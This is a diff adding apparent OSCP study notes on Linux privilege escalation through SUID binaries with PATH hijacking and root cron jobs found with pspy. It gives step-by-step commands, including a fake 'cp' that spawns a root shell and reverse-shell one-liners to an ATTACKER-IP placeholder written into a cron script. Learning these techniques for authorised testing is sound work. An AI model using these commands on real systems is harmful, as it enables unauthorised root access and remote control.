@@ -133,3 +133,154 @@ getcap -r / 2>/dev/null
 
 Were looking for any binaries we can execute or write to
 Special powers assigned to binaries 
+
+--- 
+
+## OSCP Privilege Escalation Methodology
+
+https://www.youtube.com/watch?v=VpNaPAh93vE
+
+---
+
+## SUID + PATH Hijacking Practice
+
+SUID stands for set user ID, its a special file permission on Linux that lets users execute a file with the privileges of the file owner (typically root) 
+
+```php
+-rwsr-xr-x 1 root root 12345 Jan 1 00:00 /usr/bin/passwd
+```
+
+Were looking for this `s` bit to be turned on
+In this case `passwd` is owned by root and any user is able to run it with root privileges
+
+The goal of SUID exploitation is, find an SUID root binary that:
+- you can control directly or indirectly
+- calls other programs without using absolute paths
+- can be abused using PATH hijacking
+
+PATH hijacking abuses how Linux programs find executables, if an SUID binary runs something like `ls` or another command without a full path like `/bin/ls`, it looks in the directories listed in the PATH variable
+
+If we can control the PATH, we can create a fake binary of `ls`, put it in a directory that we control, and change the PATH variable so that our version gets executed as root
+
+Step 1: find a SUID binary
+
+```php
+find / -perm -4000 2>/dev/null
+```
+
+Look for custom binaries not just standard ones such as `passwd` and `sudo`
+
+Step 2: analyze the binary
+Does it call other programs like:
+
+```php
+system("cp /tmp/file /root/file");
+```
+
+if it doesn't use full paths then it is vulnerable
+
+Step 3: build your payload
+
+In this instance we are creating a malicious version `cp`
+
+```bash
+echo '#!/bin/bash' > cp
+echo '/bin/bash' >> cp
+chmod +x cp
+```
+
+And we place it in a directory
+
+```bash
+mkdir /tmp/fakebin
+mv cp /tmp/fakebin
+```
+
+Step 4: Hijack the PATH
+
+```php
+export PATH=/tmp/fakebin:$PATH
+```
+
+Step 5: Run the SUID binary
+Now when we try to run `cp` it executes our fake `cp` and gives us a root shell
+
+SUID + PATH hijacking is about control
+If a root owned binary trusts your environment you can turn that trust into root access
+
+## PSPY + Cron Jobs
+
+`pspy` is a process monitoring tool that lets you see commands being executed in real time without needing root privileges. Its like having CCTV on the systems internals
+
+A cron job is a scheduled task in Linux, it runs automatically at specified times
+Root and other users can schedule tasks using:
+- `/etc/crontab`
+- `/etc/cron.*`
+- `crontab -e`
+
+Cron jobs are valuable because they might be running as root, they could call scripts or binaries regularly, and use files or commands that we can modify.
+
+If a cron job is calling a file or a script that is writable or it relies on a program we can hijack we can inject our own payload and wait for the cron job to execute it as root.
+
+Use `pspy` to spy on whats running on the system
+Find a cron job being run by root that calls something
+The cron job could be edited, replaced, or leveraged 
+Then we inject a reverse shell or bash command into it
+
+Step 1: Run `pspy`
+We might see some output like:
+
+```php
+2025/06/11 12:00:01 CMD: UID=0    root    /bin/sh -c /opt/backup.sh
+```
+
+The file `backupscript.sh` is being ran every minute
+
+Step 2: investigate the script
+
+```php
+ls -l /opt/backup.sh
+```
+
+Were checking if the file is writable, if the directory is writable, and what programs the file might be calling when its executed
+
+If it calls something like:
+
+```php
+#!/bin/bash
+tar czf /root/backup.tar.gz /var/www/html
+```
+
+We could try replacing `tar` with PATH hijacking
+
+Step 3: exploit it 
+
+Edit the script directly if possible, wait for the cron to execute it and gain a shell
+
+```php
+echo "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" > /opt/backup.sh
+```
+
+If a script does something like this we can hijack the PATH
+
+```php
+#!/bin/bash
+cp /home/user/file.txt /tmp/
+```
+
+If it doesn't use full paths then we can create a fake binary for it to execute, update its PATH, and run the fake binary
+
+```php
+echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' > cp
+chmod +x cp
+mkdir /tmp/fakebin
+mv cp /tmp/fakebin
+export PATH=/tmp/fakebin:$PATH
+```
+
+`pspy` is our privilege escalation radar, it exposes hidden scheduled activity
+cron is the automatic root agent waiting to be hijacked
+
+if `pspy` shows us a file being called every minute by UID 0 and we can control any part of that process then we win 
+
+---
